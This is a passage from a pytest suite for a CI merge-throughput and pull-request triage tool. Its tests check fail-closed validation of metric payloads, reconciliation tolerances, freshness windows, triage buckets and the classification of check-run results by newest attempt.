    assert run_check("conflicts", json={**base, "read_ok": True}, max=5) == 0


def test_durations_map_read_ok_sentinel_is_2():
    payload = {"durations_map": {"age_days": 3, "sampled_keys": 15, "tolerance": 0.5},
               "diverged": [], "read_ok": "UNKNOWN"}
    assert run_check("durations-map", json=payload, max_age_days=14) == 2


def test_durations_map_absent_divergence_is_2():
    payload = {"durations_map": {"age_days": 3, "sampled_keys": 15, "tolerance": 0.5},
               "read_ok": True}
    assert run_check("durations-map", json=payload, max_age_days=14) == 2


def test_durations_map_negative_age_is_2():
    payload = {"durations_map": {"age_days": -5, "sampled_keys": 15, "tolerance": 0.5},
               "diverged": [], "read_ok": True}
    assert run_check("durations-map", json=payload, max_age_days=14) == 2


def test_queue_eta_negative_eta_is_2():
    payload = {"items": [{"eta_minutes": -1}], "total_count": 1, "read_ok": True}
    assert run_check("queue-eta", json=payload, max=120, min_depth=1) == 2


def test_queue_eta_reconciliation_is_exact():
    # A 1-minute mismatch must not be waved through by a loose tolerance.
    payload = {"items": [{"eta_minutes": 1201}], "total_count": 1,
               "read_ok": True, "max_eta_minutes": 1200}
    assert run_check("queue-eta", json=payload, max=99999, min_depth=1) == 2


def test_batch_size_event_count_must_reconcile():
    payload = {"events": 100, "batch_sizes": [2], "max_batch_size": 2,
               "verified_at": NOW}
    assert run_check("batch-size", json=payload, min=2, min_depth=1,
                     require_fresh=True) == 2


def test_batch_size_negative_entry_is_2():
    payload = {"events": 1, "batch_sizes": [-1], "max_batch_size": -1,
               "verified_at": NOW}
    assert run_check("batch-size", json=payload, min=2, min_depth=1,
                     require_fresh=True) == 2


@pytest.mark.parametrize("field", [
    "queued", "in_progress", "oldest_minutes",
    "capacity_at_first_failure", "configured_max_parallel_checks",
])
def test_capacity_each_field_rejects_negative(field):
    payload = {"queued": 1, "in_progress": 1, "oldest_minutes": 60,
               "capacity_at_first_failure": 8, "configured_max_parallel_checks": 5}
    payload[field] = -1
    assert run_check("capacity", json=payload, max_oldest_minutes=120) == 2


def test_shard_balance_negative_imbalance_is_2():
    payload = {"shard_imbalance_minutes": -5,
               "legs": {"a": {"conclusion": "success"},
                        "b": {"conclusion": "success"}}}
    assert run_check("shard-balance", json=payload, max=3) == 2


def test_cycle_negative_duration_is_not_qualifying():
    runs = [{"duration_minutes": d, "heavy_leg_conclusion": "success"}
            for d in (100, 1, -100, -100)]
    assert run_check("cycle", json={"runs": runs}, max=30, min_depth=4) == 2


def test_gap_reconciliation_tolerance_is_pinned():
    # ceiling 350 / observed 100 = 3.5; a value of 2.0 is 43% off ⇒ 2.
    payload = _gap_payload()
    payload["gap"]["value"] = 2.0
    payload["gap"]["terms"]["ceiling"]["value"] = 350
    payload["gap"]["terms"]["observed"]["value"] = 100
    assert run_check("gap", json=payload, max=2) == 2


def test_gap_non_positive_observed_is_2():
    payload = _gap_payload()
    payload["gap"]["terms"]["observed"]["value"] = -50
    payload["gap"]["value"] = -2
    assert run_check("gap", json=payload, max=2) == 2


def test_gap_every_term_needs_a_source():
    payload = _gap_payload()
    del payload["gap"]["terms"]["effective_batch"]["source"]
    assert run_check("gap", json=payload, max=2) == 2


def test_gap_unknown_source_sentinel_is_2():
    payload = _gap_payload()
    payload["gap"]["terms"]["effective_batch"]["source"] = mt.UNKNOWN
    assert run_check("gap", json=payload, max=2) == 2


def test_no_languish_unknown_superseded_by_keeps_row_active():
    items = [{"number": i, "classification": "open", "moved_in_window": False,
              "superseded_by": mt.UNKNOWN} for i in range(12)]
    payload = {"items": items, "total_count": 12, "read_ok": True,
               "window_days": 7}
    assert run_check("no-languish", json=payload, exclude=["superseded_by"],
                     require_complete=True) == 1


def test_no_languish_non_string_superseded_by_is_2():
    items = [{"number": i, "classification": "open", "moved_in_window": True}
             for i in range(11)]
    items.append({"number": 11, "moved_in_window": False, "superseded_by": 123})
    payload = {"items": items, "total_count": 12, "read_ok": True}
    assert run_check("no-languish", json=payload, exclude=["superseded_by"],
                     require_complete=True) == 2


def test_main_gate_boolean_total_count_is_2():
    payload = {"required": ["a"], "check_runs": [_gcheck("a", "success")],
               "total_count": True}
    assert run_check("main-gate", json=payload, strict=True) == 2


def test_assert_queue_head_unknown_sentinel_is_2():
    payload = {"queue_head": mt.UNKNOWN, "required": ["a"], "names": ["a"]}
    assert run_check("assert-queue-head-checks", json=payload) == 2


def test_payload_from_input_keeps_a_whole_gap_record():
    record = {"gap": {"value": 2.0, "terms": {}}}
    assert mt._payload_from_input(record, "gap") == record


def test_payload_from_input_unwraps_a_check_map():
    record = {"drain-rate": {"merges_per_hour": 12.5}}
    assert mt._payload_from_input(record, "drain-rate") == {"merges_per_hour": 12.5}


def test_fast_files_collector_matches_integrity():
    import sys as _sys
    _sys.path.insert(0, str(mt.REPO / "tools"))
    import ci_selection as cs
    manifest = cs.load_manifest()
    collect = mt.collect_fast_files_unclassified()
    assert collect["fast_files_unclassified"] == cs.integrity(manifest)


def test_cli_each_numeric_flag_refuses_on_a_real_payload(tmp_path):
    rec = tmp_path / "rec.json"
    rec.write_text(_json.dumps({
        "runs": [{"duration_minutes": 1, "heavy_leg_conclusion": "success"}],
        "events": 1, "batch_sizes": [2], "max_batch_size": 2,
        "pr": 5, "entered_queue": True, "trigger": "auto_merge_conditions",
        "verified_at": NOW}))
    for flag, value in (("--min-depth", "abc"), ("--pr", "abc"),
                        ("--max", "abc"), ("--max-oldest-minutes", "abc")):
        out = _run_cli("check", "cycle", flag, value, "--input", str(rec))
        assert out.returncode == 2, (flag, out.stdout + out.stderr)
        assert flag in out.stderr


# ---------------------------------------------------------------------------
# Round-7 hardening: pin constants, near-miss tolerances, sentinel coverage.
# ---------------------------------------------------------------------------

def test_committed_constants_are_pinned():
    assert mt.MIN_OPEN_PR_POPULATION == 10
    assert mt.DEFAULT_RECORD_WINDOW_DAYS == 7
    assert mt.M4_RECORD_WINDOW_DAYS == 14
    assert mt.GAP_VALUE_TOLERANCE == 0.10
    assert mt.CEILING_TOLERANCE == 0.10
    assert mt.CEILING_MAX == 200000
    assert mt.HARD_MAX_SWEEP_CONCURRENCY == 8


def test_min_population_can_only_raise_the_committed_floor():
    nine = {"items": [{"number": i, "conflicting": False} for i in range(9)],
            "total_count": 9, "read_ok": True}
    ten = {"items": [{"number": i, "conflicting": False} for i in range(10)],
           "total_count": 10, "read_ok": True}
    assert run_check("conflicts", json=nine, max=5) == 2
    assert run_check("conflicts", json=nine, max=5, min_population=1) == 2
    assert run_check("conflicts", json=ten, max=5) == 0


def test_freshness_window_is_bounded_not_a_band():
    # 20 days is inside the mutated windows but outside both committed windows.
    capacity = {"queued": 1, "in_progress": 1, "oldest_minutes": 60,
                "capacity_at_first_failure": 8, "configured_max_parallel_checks": 5,
                "records": {f: {"verified_at": _iso(20)}
                            for f in mt._CAPACITY_FRESH_FIELDS}}
    assert run_check("capacity", json=capacity, min_headroom=1,
                     require_fresh=True) == 2
    drain = {"merges_per_hour": 12.5, "merges": 300, "window_hours": 24,
             "verified_at": _iso(8)}
    assert run_check("drain-rate", json=drain, min=12, require_fresh=True) == 2


def test_committed_default_thresholds_are_used():
    six = {"items": [{"number": i, "conflicting": i < 6} for i in range(12)],
           "total_count": 12, "read_ok": True}
    assert run_check("conflicts", json=six) == 1
    assert run_check("fast-files-unclassified",
                     json={"fast_files_unclassified": ["test_x.py"]}) == 1


def test_incomplete_results_sentinel_is_not_complete():
    conflicts = {"items": [{"number": i, "conflicting": False} for i in range(12)],
                 "total_count": 12, "read_ok": True, "incomplete_results": "true"}
    assert run_check("conflicts", json=conflicts, max=5) == 2
    assert run_check("conflicts", json={**conflicts, "incomplete_results": 1},
                     max=5) == 2
    assert run_check("conflicts", json={**conflicts, "incomplete_results": False},
                     max=5) == 0
    dm = {"durations_map": {"age_days": 1, "sampled_keys": 15, "tolerance": 0.5},
          "diverged": [], "read_ok": True, "incomplete_results": True}
    assert run_check("durations-map", json=dm, max_age_days=14) == 2


def test_partial_pagination_is_unconditional_with_a_valid_population():
    base = {"items": [{"number": i, "conflicting": False} for i in range(12)],
            "total_count": 12, "read_ok": True}
    assert run_check("conflicts", json={**base, "incomplete_results": True},
                     max=5) == 2
    rows = [{"number": i, "classification": "open", "moved_in_window": True}
            for i in range(12)]
    assert run_check("no-languish", json={"items": rows, "total_count": 12,
                                          "read_ok": True,
                                          "incomplete_results": True},
                     exclude=[], require_complete=True) == 2


def test_read_ok_strict_for_queue_eta_and_no_languish():
    eta = {"items": [{"eta_minutes": 10}], "total_count": 1, "read_ok": 1}
    assert run_check("queue-eta", json=eta, max=120, min_depth=1) == 2
    rows = [{"number": i, "classification": "open", "moved_in_window": True}
            for i in range(12)]
    assert run_check("no-languish", json={"items": rows, "total_count": 12,
                                          "read_ok": 1},
                     exclude=[], require_complete=True) == 2


def test_reconciliation_near_misses_are_refused():
    # batch: claimed 2 over [1]
    assert run_check("batch-size", json={"events": 1, "batch_sizes": [1],
                                         "max_batch_size": 2, "verified_at": NOW},
                     min=2, min_depth=1, require_fresh=True) == 2
    # cycle: median off by one minute
    runs = [{"duration_minutes": 37, "heavy_leg_conclusion": "success"}
            for _ in range(5)]
    assert run_check("cycle", json={"runs": runs, "median_minutes": 36},
                     max=30, min_depth=5) == 2
    # gap: 15% off the derived ratio
    p = _gap_payload(2.0)
    p["gap"]["value"] = 2.3
    assert run_check("gap", json=p, max=2) == 2


def test_or_artifact_tolerance_is_bounded(tmp_path):
    text = ARTIFACT.replace("ceiling_prs_per_day: 234", "ceiling_prs_per_day: 280")
    path = _artifact(tmp_path, text)
    assert run_check("prs-per-day", json=_ceiling_payload(100), min=200,
                     or_artifact=f"{path}#ceiling") == 2


def test_fast_files_collector_errors_fail_closed(monkeypatch):
    monkeypatch.setattr(mt, "_gh_api", lambda *a, **k: None)
    import ci_selection as cs
    monkeypatch.setattr(cs, "load_manifest",
                        lambda *a, **k: (_ for _ in ()).throw(RuntimeError("boom")))
    out = mt.collect_fast_files_unclassified()
    assert out == {}
    assert run_check("fast-files-unclassified", json=out, max=0) == 2


def test_batch_size_empty_window_without_events_is_2():
    payload = {"events": 0, "batch_sizes": [], "max_batch_size": 1,
               "verified_at": NOW}
    assert run_check("batch-size", json=payload, min=2, require_fresh=True) == 2


def test_collect_conflicts_retains_unprobed_prs(monkeypatch):
    monkeypatch.setattr(mt, "_gh_api", lambda *a, **k: [
        {"number": 1, "head": {"sha": "a", "ref": "b1"}},
        {"number": 2, "head": {}},
    ])
    monkeypatch.setattr(mt, "live_main_sha", lambda: "sha")
    monkeypatch.setattr(mt, "merge_tree_conflict", lambda *a, **k: False)
    monkeypatch.setattr(mt, "_ensure_object", lambda sha: None)
    out = mt.collect_conflicts(bound=1)
    assert out["total_count"] == 2
    assert out["items"][1]["unknown"] is True


# ---------------------------------------------------------------------------
# Round-8 hardening: close the mutations that survived the round-7 suite.
# ---------------------------------------------------------------------------

def test_parallelism_headroom_rejects_negative_fields():
    ok = {"capacity_at_first_failure": 8, "configured_max_parallel_checks": 5,
          "records": _cap_records()}
    for bad in ({"capacity_at_first_failure": -1},
                {"configured_max_parallel_checks": -1},
                {"capacity_at_first_failure": -1,
                 "configured_max_parallel_checks": -5}):
        assert run_check("parallelism-headroom", json={**ok, **bad},
                         require_fresh=True) == 2, bad


def test_sweep_concurrency_hard_ceiling_is_8(monkeypatch):
    monkeypatch.setattr(mt.os, "cpu_count", lambda: 32)
    monkeypatch.delenv("MERGE_THROUGHPUT_MAX_CONCURRENCY", raising=False)
    with pytest.raises(SystemExit):
        mt.validate_sweep_concurrency(9)


def test_or_artifact_ceiling_above_the_committed_range_is_2(tmp_path):
    text = ("## ceiling\nceiling_prs_per_day: 300000\n"
            "ceiling_source: effective_parallel,effective_batch,cycle_minutes\n")
    payload = {"prs_per_day": 100, "gap": {"terms": {
        "effective_parallel": {"value": 100, "source": "M3"},
        "effective_batch": {"value": 10, "source": "M5"},
        "cycle_minutes": {"value": 4.8, "source": "M2"}}}}
    assert run_check("prs-per-day", json=payload, min=200,
                     or_artifact=f"{_artifact(tmp_path, text)}#ceiling") == 2


def test_gap_non_positive_ceiling_is_2(gap_repo):
    p = _gap_payload(2.0)
    p["gap"]["terms"]["ceiling"]["value"] = 0
    p["gap"]["value"] = 0
    assert run_check("gap", json=p, max=2) == 2


def test_gap_missing_named_term_is_2(gap_repo):
    p = _gap_payload()
    got = p["gap"]["terms"].pop("wait")
    p["gap"]["terms"]["x1"] = got
    assert run_check("gap", json=p, max=2) == 2


def test_capacity_require_complete_reconciles_population():
    ok = {"queued": 1, "in_progress": 1, "oldest_minutes": 60,
          "capacity_at_first_failure": 8, "configured_max_parallel_checks": 5,
          "items": [{"id": 1}], "total_count": 1, "records": _cap_records()}
    assert run_check("capacity", json=dict(ok, total_count=3),
                     require_complete=True) == 2


def test_capacity_fresh_string_record_is_age_checked(tmp_path, monkeypatch):
    (tmp_path / "rec.json").write_text(_json.dumps({"verified_at": _iso(30)}))
    monkeypatch.setattr(mt, "REPO", tmp_path)
    payload = {"queued": 1, "in_progress": 1, "oldest_minutes": 60,
               "capacity_at_first_failure": 8, "configured_max_parallel_checks": 5,
               "records": {f: "rec.json" for f in mt._CAPACITY_FRESH_FIELDS}}
    assert run_check("capacity", json=payload, min_headroom=1,
                     require_fresh=True) == 2


def test_merge_tree_error_is_unknown(monkeypatch):
    def fake_run(cmd, **kw):
        if "rev-parse" in cmd:
            return SimpleNamespace(returncode=0, stdout="x", stderr="")
        return SimpleNamespace(returncode=2, stdout="", stderr="fatal")

    monkeypatch.setattr(mt.subprocess, "run", fake_run)
    assert mt.merge_tree_conflict(Path("."), "origin/main", "origin/x") is mt.UNKNOWN


def test_gap_malformed_and_non_numeric_terms_are_2(gap_repo):
    p = _gap_payload()
    p["gap"]["terms"]["wait"] = None
    assert run_check("gap", json=p, max=2) == 2
    p = _gap_payload()
    p["gap"]["terms"]["wait"]["value"] = mt.UNKNOWN
    assert run_check("gap", json=p, max=2) == 2


def test_attribution_rejects_non_boolean_main_red():
    ok = {"pr": 5, "main_red": False, "culprit_sha": "a" * 40}
    assert run_check("attribution", json=dict(ok, main_red="yes"), pr=5, max=5) == 2


def test_conflicts_and_no_languish_reconcile_without_require_complete():
    mismatch = {"items": [{"number": i, "conflicting": False} for i in range(12)],
                "total_count": 10, "read_ok": True}
    assert run_check("conflicts", json=mismatch, max=5) == 2
    rows = {"items": [{"number": i, "classification": "open", "moved_in_window": True}
                      for i in range(12)], "total_count": 10, "read_ok": True}
    assert run_check("no-languish", json=rows, exclude=[]) == 2


def test_require_fresh_is_refused_where_no_freshness_test_exists():
    for name, payload, opts in (
        ("queue-eta", {"items": [{"eta_minutes": 10}], "total_count": 1,
                       "read_ok": True}, {"max": 120, "min_depth": 1}),
        ("prs-per-day", {"prs_per_day": 250,
                         "verified_at": "2020-01-01T00:00:00Z"}, {"min": 200}),
        ("conflicts", {"items": [{"number": i, "conflicting": False}
                                 for i in range(12)],
                       "total_count": 12, "read_ok": True}, {"max": 5}),
    ):
        assert run_check(name, json=payload, require_fresh=True, **opts) == 2, name


def test_sha_sentinels_never_bind_a_head():
    runs = [{"name": "a", "status": "completed", "conclusion": "success", "id": 1,
             "details_url": "x/1", "app": {"slug": "g"}, "workflow": "w"}]
    assert run_check("main-gate", json={
        "check_runs": runs, "total_count": 1, "required": ["a"],
        "sha": mt.UNKNOWN, "live_main_sha": mt.UNKNOWN},
        strict=True, require_fresh=True) == 2
    assert run_check("queue-entry", json={
        "pr": 5, "entered_queue": True, "trigger": "auto_merge_conditions",
        "head_sha": mt.UNKNOWN, "run_sha": mt.UNKNOWN,
        "verified_at": NOW}, pr=5, require_fresh=True) == 2


def test_duplicate_check_run_ids_are_unknown():
    def run(conclusion, ident):
        return {"name": "a", "status": "completed", "conclusion": conclusion,
                "id": ident, "details_url": f"x/{ident}", "app": {"slug": "g"},
                "workflow": "w"}

    assert mt.verdict_from_check_runs([run("success", 7), run("failure", 7)]) == mt.UNKNOWN
    assert mt.mergify_mergeable([run("failure", 7), run("success", 7)]) == mt.UNKNOWN


def test_report_does_not_launder_a_failed_collector(monkeypatch):
    for fn in ("collect_conflicts", "collect_fast_files_unclassified",
               "api_main_sha", "fetch_check_runs"):
        monkeypatch.setattr(mt, fn, lambda *a, **k: {})
    monkeypatch.setattr(mt, "live_main_sha", lambda *a, **k: mt.UNKNOWN)
    # Task 4b: the shard/durations collectors are live reads too, so a failed
    # one must stay UNKNOWN and must not be laundered.
    monkeypatch.setattr(mt, "collect_shard_balance", lambda *a, **k: {})
    monkeypatch.setattr(mt, "collect_durations_map", lambda *a, **k: {})
    report = mt.build_report(fixture=None)
    assert report["fast_files_unclassified"] is mt.UNKNOWN
    assert report["durations_map"]["sampled_keys"] is mt.UNKNOWN
    assert report["shard_imbalance_minutes"] is mt.UNKNOWN
    # #6135: the newly surfaced critical-path metric must not be laundered
    # either — a failed collector leaves it UNKNOWN, not 0.
    assert report["max_shard_minutes"] is mt.UNKNOWN
    assert report["shard_count"] is mt.UNKNOWN
    assert report["legs"] is mt.UNKNOWN
    assert report["diverged"] is None


# ---------------------------------------------------------------------------
# Round-9: S4's disjunction, its freshness clause, Task 5's `bucket` schema.
# ---------------------------------------------------------------------------

def test_prs_per_day_threshold_is_a_real_disjunct(tmp_path):
    # S4: "passes on the threshold OR a typed INTEGER ceiling". With the
    # threshold met the artifact is not required, and an unreadable one must not
    # turn a met outcome into a miss.
    assert run_check("prs-per-day", json={"prs_per_day": 300}, min=200,
                     or_artifact=f"{tmp_path / 'nope.md'}#ceiling") == 0
    assert run_check("prs-per-day", json={"prs_per_day": 150}, min=200,
                     or_artifact=f"{tmp_path / 'nope.md'}#ceiling") == 2


def test_prs_per_day_requires_a_fresh_snapshot(tmp_path):
    path = _artifact(tmp_path, ARTIFACT)
    assert run_check("prs-per-day", json={"prs_per_day": 250}, min=200,
                     require_fresh=True) == 2
    assert run_check("prs-per-day",
                     json={"prs_per_day": 250, "verified_at": NOW}, min=200,
                     require_fresh=True) == 0
    assert run_check("prs-per-day",
                     json={"prs_per_day": 250, "verified_at": _iso(30)}, min=200,
                     require_fresh=True) == 2
    # Below the threshold the ceiling branch decides, and its stamp must be fresh.
    assert run_check("prs-per-day", json=_ceiling_payload(10), min=200,
                     or_artifact=f"{path}#ceiling", require_fresh=True) == 2


def test_no_languish_excludes_task_5_buckets():
    rows = [{"number": i, "bucket": "hard_stop", "draft": False,
             "hard_stop": True, "terminal_decision": False,
             "conflict": False, "superseded_by": None,
             "moved_in_window": False} for i in range(12)]
    assert run_check("no-languish", json={"items": rows, "total_count": 12,
                                          "read_ok": True, "window_days": 7},
                     exclude=["hard_stop", "terminal_decision", "draft",
                              "superseded_by"],
                     require_complete=True) == 2
    rows = [{"number": i, "bucket": "eligible", "draft": False,
             "hard_stop": False, "terminal_decision": False,
             "conflict": False, "surface_evidence": FRESH_EVIDENCE,
             "moved_in_window": True} for i in range(12)]
    assert run_check("no-languish", json={"items": rows, "total_count": 12,
                                          "read_ok": True, "window_days": 7},
                     exclude=["hard_stop", "terminal_decision", "draft",
                              "superseded_by"],
                     require_complete=True) == 0
    bad = [{"number": i, "bucket": 3, "moved_in_window": True} for i in range(12)]
    assert run_check("no-languish", json={"items": bad, "total_count": 12,
                                          "read_ok": True, "window_days": 7},
                     exclude=[], require_complete=True) == 2


def test_queue_entry_unknown_trigger_is_unknown_not_a_miss():
    base = {"pr": 5, "entered_queue": True, "verified_at": NOW}
    assert run_check("queue-entry", json={**base, "trigger": mt.UNKNOWN},
                     pr=5) == 2
    assert run_check("queue-entry", json={**base, "trigger": "manual"},
                     pr=5) == 1


# ---------------------------------------------------------------------------
# Round-10: the documented `python3` invocation, and an observed `false`.
# ---------------------------------------------------------------------------

@pytest.mark.skipif(not Path("/usr/bin/python3").exists(),
                    reason="no system python3 to mirror the plan's command")
def test_tool_runs_under_the_documented_system_python3():
    """Every §11 criterion is written `python3 tools/merge_throughput.py …`.

    A crash at import exits 1 — the contract's MISS — so an interpreter the
    tool cannot import is a fabricated red, not an error. The tool must not
    require an interpreter newer than the one the plan's commands use.
    """
    result = subprocess.run(
        ["/usr/bin/python3", str(ROOT / "tools" / "merge_throughput.py"),
         "check", "capacity"],
        capture_output=True, text=True, cwd=ROOT,
    )
    assert result.returncode == 2, result.stderr
    assert "ImportError" not in result.stderr
    assert "Traceback" not in result.stderr


def test_queue_entry_observed_false_is_a_miss():
    base = {"pr": 5, "trigger": "auto_merge_conditions", "verified_at": NOW}
    assert run_check("queue-entry", json={**base, "entered_queue": False},
                     pr=5) == 1
    assert run_check("queue-entry", json={**base, "entered_queue": "false"},
                     pr=5) == 2


# ---------------------------------------------------------------------------
# Task 5 — eligibility triage (plan §10 Task 5): ordered buckets, owners, no
# mutation. The acceptance criteria are: exactly the schema keys; `bucket` is
# FIRST-MATCH-WINS; the boolean columns are INDEPENDENT; `owner` is never the
# PR author; counts reconcile; `--triage` issues no mutating request.
# ---------------------------------------------------------------------------

WORKLIST_JSON = ROOT / "docs" / "ci" / "triage" / "2026-09-27-eligible-worklist.json"
OWNER_EVIDENCE_JSON = ROOT / "docs" / "ci" / "triage" / "owner-evidence.json"
NO_LANG_JSON = ROOT / "docs" / "ci" / "triage" / "2026-09-27-no-languish.json"


def _pr(number=1, title="a (#2)", draft=False, branch="fix/2-a", body=""):
    return {"number": number, "title": title, "draft": draft,
            "head": {"ref": branch}, "body": body}


#: Canonical `surface_evidence` strings, exactly as the live collector emits
#: them. A row is only clean when its OWN evidence re-derives its bucket.
FRESH_EVIDENCE = "verdict=GREEN; stale=0; produced=2026-09-27T00:00:00Z"
STALE_EVIDENCE = ("verdict=GREEN; stale=1; produced=2026-09-25T00:00:00Z; "
                  "base_red_started=2026-09-27T10:45:26Z; red=test (b)")
MERGE_REF_EVIDENCE = ("verdict=GREEN; stale=1; produced=2026-09-27T09:00:00Z; "
                      "merge_ref_base=" + "a" * 40 + "; base_head=" + "b" * 40)
RED_EVIDENCE = "verdict=RED; reds=python-ci-gate"
PENDING_EVIDENCE = "verdict=PENDING; pending=2"


def _row(pr, *, surface=mt.SURFACE_GREEN, stale=False, evidence=FRESH_EVIDENCE,
         **kw):
    """A row with the surface dimension supplied the way the live reader does."""
    return mt.build_triage_row(pr, surface=surface, stale=stale,
                               surface_evidence=evidence, **kw)


def test_triage_schema_keys_are_exact():
    row = _row(_pr(), conflict=False)
    assert set(row) == set(mt.TRIAGE_SCHEMA_KEYS)
    assert tuple(mt.TRIAGE_SCHEMA_KEYS) == (
        "number", "bucket", "eligible", "conflict", "conflicted_paths",
        "superseded_by", "surface_evidence", "draft", "hard_stop",
        "terminal_decision", "owner", "owner_evidence", "owning_issue")


def test_triage_unobserved_is_unknown_never_eligible():
    row = mt.build_triage_row(_pr(), conflict=mt.UNKNOWN)
    assert row["conflict"] == mt.UNKNOWN
    assert row["bucket"] == mt.UNKNOWN    # an unobserved conflict cannot read clean
    assert row["eligible"] == mt.UNKNOWN
    assert row["draft"] is False          # an OBSERVED column stays observed
    # An OBSERVED-clean conflict with an UNOBSERVED surface is also UNKNOWN: a
    # clean merge is not a green surface, and green alone is not sufficient.
    assert mt.build_triage_row(_pr(), conflict=False)["bucket"] == mt.UNKNOWN
    assert mt.classify_bucket(1, draft=False, conflict=False) == mt.UNKNOWN
    assert mt.classify_bucket(1, draft=False, conflict=False,
                              surface=mt.SURFACE_GREEN) == mt.UNKNOWN
    assert mt.classify_bucket(1, draft=False, conflict=False,
                              surface=mt.SURFACE_GREEN,
                              stale=mt.UNKNOWN) == mt.UNKNOWN


@pytest.mark.parametrize("number,expected", [
    (5136, "hard_stop"), (5461, "hard_stop"), (5465, "hard_stop"),
    (5467, "hard_stop"), (5468, "hard_stop"),
    (5285, "terminal_decision"), (4963, "terminal_decision"),
    (5190, "dead_weight"), (5453, "dead_weight"), (5455, "dead_weight"),
    (5460, "draft"),
])
def test_named_dispositions_win_the_first_match(number, expected):
    # Every named PR is deliberately ALSO a draft and conflicted; the named
    # disposition must win, which is exactly why the buckets are ordered.
    row = mt.build_triage_row(
        _pr(number=number, draft=True, branch=f"fix/{number}-x"), conflict=True)
    assert row["bucket"] == expected
    assert row["eligible"] is False
    assert row["draft"] is True                 # the boolean is independent
    assert row["hard_stop"] is (expected == "hard_stop")
    assert row["terminal_decision"] is (expected == "terminal_decision")


def test_draft_beats_conflicting_and_conflict_beats_eligible():
    assert mt.classify_bucket(9999, draft=True, conflict=True) == "draft"
    assert mt.classify_bucket(9999, draft=False, conflict=True) == "conflicting"
    assert mt.classify_bucket(9999, draft=False, conflict=False,
                              surface=mt.SURFACE_GREEN,
                              stale=False) == "eligible"


def test_surface_verdict_selects_the_rail_refusal_class():
    """The rail's three refusal classes map to three buckets, in order.

    (a) ACCEPT -> `eligible`; (b) BLOCK -> `blocked` (the PR's OWN tree fails
    — the correct refusal, not a bug); (c) RE-MEASURE -> `re_measure` (a GREEN
    surface a base red started after). The `stale` verdict is what separates
    (a) from (c), so a green surface without it is never a bucket.
    """
    assert mt.classify_bucket(1, draft=False, conflict=False,
                              surface=mt.SURFACE_GREEN, stale=False) == "eligible"
    assert mt.classify_bucket(1, draft=False, conflict=False,
                              surface=mt.SURFACE_GREEN, stale=True) == "re_measure"
    for verdict in (mt.SURFACE_RED, mt.SURFACE_PENDING):
        assert mt.classify_bucket(1, draft=False, conflict=False,
                                  surface=verdict, stale=False) == "blocked"
        # A `stale` verdict is meaningless for a non-green surface and must not
        # turn BLOCK into RE-MEASURE.
        assert mt.classify_bucket(1, draft=False, conflict=False,
                                  surface=verdict, stale=True) == "blocked"
    # The named/draft/conflicting dispositions still WIN over the surface.
    assert mt.classify_bucket(5136, draft=False, conflict=False,
                              surface=mt.SURFACE_RED, stale=False) == "hard_stop"
    assert mt.classify_bucket(1, draft=True, conflict=False,
                              surface=mt.SURFACE_RED, stale=False) == "draft"
    assert mt.classify_bucket(1, draft=False, conflict=True,
                              surface=mt.SURFACE_GREEN, stale=True) == "conflicting"


# ---------------------------------------------------------------------------
# The evaluated-tree surface: the rail's §4.5/§4.6/§4.7, observed.
# ---------------------------------------------------------------------------

def _cr(number, name, conclusion, *, status="completed", app="github-actions",
        rid=None, started="2026-09-27T10:00:00Z",
        completed="2026-09-27T10:05:00Z", html_url=""):
    return {"id": rid if rid is not None else number, "name": name,
            "status": status, "conclusion": conclusion, "app": {"slug": app},
            "started_at": started, "completed_at": completed,
            "html_url": html_url}


def test_surface_probe_newest_attempt_per_app_name_decides():
    """A re-run leaves the OLD failing run beside the new one: only the newest
    attempt may decide, or the tool reports a red GitHub itself shows green."""
    verdict, anchor, reds, pending = mt.classify_surface_runs([
        _cr(1, "python-ci-gate", "failure"),
        _cr(2, "python-ci-gate", "success", completed="2026-09-27T10:35:00Z"),
    ])
    assert verdict == mt.SURFACE_GREEN
    assert reds == [] and pending == 0
    assert anchor == "2026-09-27T10:35:00Z"


def test_surface_probe_newest_attempt_is_by_id_not_by_timestamp():
    """`id` decides the newest attempt — NOT a timestamp.

    GitHub does not guarantee that a re-run's `completed_at` is later than the
    run it supersedes (a re-run can complete quickly while the superseded run
    was long, and a re-run's start is recorded for the WHOLE attempt). If
    ordering were timestamp-primary, an OLDER id carrying a later timestamp
    would win and a genuine red would be dropped — the false GREEN this
    grouping exists to prevent. Here the newer id is the RED, so an
    id-primary read must report RED and a timestamp-primary read would not.
    """
    verdict, _anchor, reds, _pending = mt.classify_surface_runs([
        _cr(1, "python-ci-gate", "success",
            started="2026-09-27T09:00:00Z",
            completed="2026-09-27T12:00:00Z"),
        _cr(2, "python-ci-gate", "failure",
            started="2026-09-27T09:30:00Z",
            completed="2026-09-27T11:00:00Z"),
    ])
    assert verdict == mt.SURFACE_RED
    assert reds == [("python-ci-gate", "2026-09-27T09:30:00Z")]


def test_surface_probe_unknown_conclusion_is_red():
    verdict, _anchor, reds, _pending = mt.classify_surface_runs([
        _cr(1, "mystery", "weird_new")])
    assert verdict == mt.SURFACE_RED
    assert reds == [("mystery", "2026-09-27T10:00:00Z")]


def test_surface_probe_in_flight_is_pending_not_red():
    verdict, _anchor, reds, pending = mt.classify_surface_runs([
        _cr(1, "test (a)", None, status="in_progress", completed=None)])
    assert verdict == mt.SURFACE_PENDING
    assert reds == [] and pending == 1


def test_surface_probe_empty_surface_is_unknown():
    assert mt.classify_surface_runs([])[0] == mt.UNKNOWN
    assert mt.classify_surface_runs("not-a-list")[0] == mt.UNKNOWN


def test_surface_probe_unorderable_group_is_unknown_not_green():
    """A partial order is not an order — list order must not decide newest."""
    assert mt.classify_surface_runs([
        _cr(1, "x", "failure", rid=0),
        _cr(2, "x", "success", rid=0)])[0] == mt.UNKNOWN
    assert mt.classify_surface_runs([
        _cr(1, "x", "failure", rid=2),
        {"name": "x", "status": "completed", "conclusion": "success",
         "app": {"slug": "github-actions"}, "completed_at": None}])[0] == \
        mt.UNKNOWN


def test_surface_probe_non_measuring_check_does_not_set_the_anchor():
    """`skipped` exercised nothing, so it must not advance the last-production
    time (the #1353 fail-open where a non-measurement moved the anchor)."""
    verdict, anchor, _reds, _pending = mt.classify_surface_runs([
        _cr(1, "test (a)", "skipped", completed="2026-09-27T12:00:00Z"),
        _cr(2, "test (b)", "success", completed="2026-09-27T09:00:00Z"),
    ])
    assert verdict == mt.SURFACE_GREEN
    assert anchor == "2026-09-27T09:00:00Z"


def test_surface_probe_unnamed_runs_are_keyed_per_entry_not_collapsed():
    """An UNNAMED run is classified on its OWN identity (#1353).

    The rail keys an unnamed run by its own per-entry identity as well as
    `(app, name)`, so a newer unnamed non-red cannot SUPERSEDE an older unnamed
    red and discard it before classification. Collapsing every unnamed run into
    one `(app, "(unnamed check)")` group and keeping only the newest id drops
